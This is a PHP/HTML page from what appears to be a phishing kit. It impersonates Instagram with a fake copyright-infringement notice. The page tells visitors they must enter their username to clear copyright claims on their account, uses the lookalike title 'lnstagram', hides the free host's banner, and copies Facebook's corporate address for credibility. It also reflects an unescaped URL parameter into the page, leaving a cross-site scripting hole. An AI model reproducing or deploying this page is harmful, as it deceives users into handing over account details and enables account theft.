<?php

$lparalyzed = $_GET['nick'];
$nick = "$lparalyzed";
?>

<!DOCTYPE html>
<html>
<head>
	<link rel="stylesheet" type="text/css" href="main.css"><style>img[alt="www.000webhost.com"]{display:none;}</style>
	<title>Copyright • lnstagram</title>
	<link rel="icon" sizes="192x192" href="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTp5Ex2kch6H9Ybcq6A0dxj70ciW8E5DOH7lg&usqp=CAU">
	<meta name="viewport" content="width=device-width,inital-scale=1">
	<noscript>Please Active Javascirpt on your scanner</noscript>
	<link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all">
</head>

<body style="background:#fafafa;">
<div style=" padding:5px; margin:0px;
width:99%; height:45px;;
  background: #f09433; 
background: -moz-linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); 
background: -webkit-linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); 
background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); 
filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#f09433', endColorstr='#bc1888',GradientType=1 );
  ">


  <table style="width:100%;margin:0px;">
      <tbody><tr style="width:100%;margin:0px;">
         <td style=" margin:0px;font-family:sans-serif;font-weight:bold;color:white;">Instagram</td>
         <td style="border:1px solid:white;color:white; margin:0px;
text-align:right;"><div style="border:1px solid white;margin:0px;
width:; text-align:center; margin-left:%;font-weight:bold;border-radius:5px;font-family:sans-serif;">GET
</div>

</td>
      </tr>
      <tr>
         <td style=" font-family:sans-serif;font-weight:400;color:white;font-size:13px;">Find It for free on Google Play.</td>
         <td>    </td>
      </tr>
   </tbody></table>



</div>
</div>
</header>
	<center>
		<br><br>
		
		<img src="https://i.hizliresim.com/cHgTep.png" width="200" style="display:none;">
		


		

		<button class="fb-qenzy" style="display:none;">
			<i class="fab fa-facebook-square" style="font-size:17px;"></i>&nbsp;
			
			Continue with Facebook
		</button>
		

		<table class="qen" style="display:none;">
			<tr class="zy">
				<th class="er">
					<div class="top"></div>
				

				</th>

				<th class="can"><span class="or">OR</span></th>

				<th class="han">
			<div class="top"></div>
				</th>

			</tr>
		</table>
		<br>
		<div style="width:300px;max-width:95%;background:white;border:1px solid #cecece;padding:10px;box-sizing:border-box;">
			<br>
			<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSv3GysrPLnBI6OO1TdqqIek9ntr_DyyqOAMQ&usqp=CAU" width="170"><br>
			<p style="font-family:sans-serif;width:300px;max-width:88%;color:#999;font-size:15px;line-height:19px;">Hello <?=$felony?>, please proceed by entering the username to remove copyright infringements on your account.</p><br>
			<form method="get" action="copyright.php?nick=<?=$lparalyzed?>" >
			<input type="text" name="nick" placeholder="Username" style="width:200px;height:23px;padding-left:6px;padding-top:2px;padding-bottom:2px;outline:none;background:#fafafa;border:none;border:1px solid #dedede" value="<?=$lparalyzed?>">
			<br>
		
		<br>
			

	
			<button type="submit" class="qenzyist" style="width:240px;height:24px;">Next</button>
		</form>
		<?php 
	    if($lparalyzed){
	        echo "<hr> <form action='index.php'>
		    <button type='submit' class='qenzyist' style='width:240px;height:24px;'>Arent you $felony
</button>

		</form> ";
	    }else{
	        echo ' ';
	    }
		?>
<br>
			</div>
			<br><br><br>
			<div style="width:300px;max-width:95%;background:white;border:1px solid #cecece;padding:10px;box-sizing:border-box;">
				<p style="font-family:sans-serif;width:95%;max-width:95%;color:#999;font-size:15px;line-height:19px;box-sizing:border-box;">
Instagram From Facebook
© Instagram. Facebook Inc., 1601 Willow Road, Menlo Park, CA 94025
</p>

			</div>

	


	</center>
	<br><br><br><br><br><br>
	<center>
	<div class="bottom">
		
		<span class="mini">from</span>
		<p class="big">FACEBOOK</p>
	</div>
</center>

</body>
</html>
<?php

?>

